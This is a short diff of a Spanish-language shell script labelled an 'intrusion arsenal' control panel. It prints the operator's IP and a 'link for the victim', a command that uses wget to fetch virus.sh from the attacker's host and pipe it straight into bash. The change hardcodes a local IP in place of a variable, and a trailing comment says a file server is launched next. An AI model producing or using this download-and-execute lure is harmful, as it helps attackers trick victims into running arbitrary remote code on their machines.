@@ -7,7 +7,7 @@ echo "  ARSENAL DE INTRUSIÓN - PANEL DE CONTROL"
 echo "----------------------------------------------------"
 echo "1. Tu IP es: $MI_IP"
 echo "2. Link para la víctima:"
-echo "   wget -qO- http://$MI_IP:8080/virus.sh | bash"
+echo "   wget -qO- http://192.168.1.109:8080/virus.sh | bash"
 echo "----------------------------------------------------"
 
 # Lanzamos el servidor de archivos
